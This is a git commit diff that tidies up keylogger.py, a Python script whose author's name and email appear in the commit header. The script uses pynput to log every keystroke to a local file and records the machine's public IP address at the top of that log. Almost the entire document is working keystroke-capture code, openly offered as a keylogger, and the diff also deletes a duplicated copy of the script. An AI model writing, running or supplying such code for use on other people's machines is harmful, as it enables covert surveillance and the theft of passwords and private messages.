2cca82de8b79e9f5cc4824d703026eae0bf473f0
Pedro Monteiro <pmapm@ua.pt>
2024-09-04 15:46:13 +0100

    small updates

--- keylogger.py
+++ keylogger.py
@@ -4,23 +4,31 @@ import requests
 
 from pynput.keyboard import Key, Listener
 
+# This function writes the keys to the log file
+def write_to_file(key):
+    with open('log.txt', 'a') as f:
+        # Convert key to a string and remove quotes
+        k = str(key).replace("'", "")
+        
+        # Handle special keys
+        if k == 'Key.space':
+            f.write(' ')  # Write a space for spacebar
+        elif k == 'Key.enter':
+            f.write('\n')  # Newline for enter key
+        elif 'Key' in k:
+            f.write(f'[{k}]')  # Write key name for other special keys
+        else:
+            f.write(k)  # Write the character as is
+
+# Callback function for key press
 def press(key):
     print("{} pressed".format(key))
     write_to_file(key)
 
+# Callback function for key release
 def release(key):
-    if key is Key.esc:
-        return False
-
-def write_to_file(key):
-    with open('log.txt', 'a') as f:
-        k = str(key).replace("'", "")  # remove ' from output file
-        if k.find("space") > 0:
-            f.write(' ')
-        elif k.find("enter") > 0:
-            f.write('\n')
-        elif k.find("Key") == -1:
-            f.write(k)
+    if key == Key.esc:
+        return False  # Stop listener when 'esc' is pressed
 
 # Get the internet IP address
 response = requests.get("https://api.ipify.org?format=json")
@@ -31,42 +39,7 @@ print("Internet IP Address:", ip_address)
 with open('log.txt', 'w') as f:
     f.write("Internet IP Address: {}\n".format(ip_address))
 
-with Listener(on_press=press, on_release=release) as listener:
-    try:
-        listener.join()
-    except KeyboardInterrupt:
-        sys.exit(0)
-import pynput
-import sys
-import requests
-
-from pynput.keyboard import Key, Listener
-
-def press(key):
-    print("{} pressed".format(key))
-    write_to_file(key)
-
-def release(key):
-    if key is Key.esc:
-        return False
-
-def write_to_file(key):
-    with open('log.txt', 'a') as f:
-        k = str(key).replace("'", "")  # remove ' from output file
-        if k.find("space") > 0:
-            f.write(' ')
-        elif k.find("enter") > 0:
-            f.write('\n')
-        elif k.find("Key") == -1:
-            f.write(k)
-
-response = requests.get("https://api.ipify.org?format=json") # get IP address
-ip_address = response.json()["ip"]
-print("Internet IP Address:", ip_address)
-
-with open('log.txt', 'w') as f:
-    f.write("Internet IP Address: {}\n".format(ip_address))
-
+# Start the keyboard listener
 with Listener(on_press=press, on_release=release) as listener:
     try:
         listener.join()
